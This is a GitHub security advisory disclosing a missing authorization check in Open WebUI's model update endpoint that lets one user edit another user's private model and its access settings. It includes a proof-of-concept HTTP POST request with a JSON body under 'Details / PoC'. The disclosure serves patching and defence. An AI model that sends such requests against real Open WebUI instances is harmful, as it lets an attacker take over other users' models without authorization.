# [M] Open WebUI missing authorization check at the model update function - models from other users can be updated

## Summary
Severity: Medium
Advisory: GHSA-gm54-m39w-grjp
CVE: CVE-2026-45345
CWE: CWE-285
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-gm54-m39w-grjp
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.5.7

## Details
### Summary
A user can modify another user's model even if its visibility is set to `Private`.
The finding resulted from a penetration test for a customer. It is suspected that the root cause of the issue lies within the core of Open WebUI, which is why it is being reported as a security issue here. Tested on Open WebUI 0.5.4.

### Details / PoC
The user `Victim` created a private model with the visibility set to `private`: 
![grafik](https://github.com/user-attachments/assets/de057943-512b-46bf-8671-2904d55ec056)

The user `Attacker` can edit this model using the following POST request:
```
POST /api/v1/models/model/update?id=aaabraaa HTTP/2
Host: domain.local
//Some headers removed
Te: trailers

{"id":"aaabraaa","base_model_id":"gpt-4o-POC","name":"testmodel","meta":{"profile_image_url":"/static/favicon.png","description":"","capabilities":{"vision":true,"usage":false,"citations":true},"suggestion_prompts":null,"tags":[],"toolIds":["test"]},"params":{},"user_id":"565c82e6-083f-42bb-bf0f-a4e214cfb9ad","access_control":{"read":{"group_ids":[],"user_ids":[]},"write":{"group_ids":[],"user_ids":[]}},"is_active":true,"updated_at":1737314575,"created_at":1737121281}
```
Request / Response
![grafik](https://github.com/user-attachments/assets/19986403-b782-4288-b618-202b55519bb1)

### Impact
A user can modify another user's model even if its visibility is set to `Private`. By changing the access permissions during editing, unauthorized access can be gained.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-gm54-m39w-grjp
- https://nvd.nist.gov/vuln/detail/CVE-2026-45345
- https://github.com/open-webui/open-webui
